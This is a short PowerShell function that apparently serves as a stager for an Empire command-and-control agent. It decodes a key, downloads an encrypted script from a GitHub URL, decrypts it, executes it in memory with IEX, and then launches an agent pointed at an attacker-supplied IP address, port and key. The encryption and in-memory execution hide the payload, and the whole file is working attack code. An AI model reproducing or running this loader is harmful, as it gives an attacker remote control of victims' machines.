function Agent {
	param (
		 #Default Strings, should be replaced via command line arguments. 
		[string]$key,
		[string]$eip,
		[string]$ep,
		[string]$ek
	)

	$EncryptKey = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($key))
	$EncryptKey = [System.Text.Encoding]::Unicode.GetBytes($EncryptKey)
	$InvokeScript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ngiapmaces/rt/master/invoker')
	$InvokeAgent = $InvokeScript | ConvertTo-SecureString -Key $EncryptKey 

	$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($InvokeAgent)
	$InvokeAgent = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)


	IEX $InvokeAgent
	Invoke-Agent -empireIP $eip -empirePort $ep -empireKey $ek 

}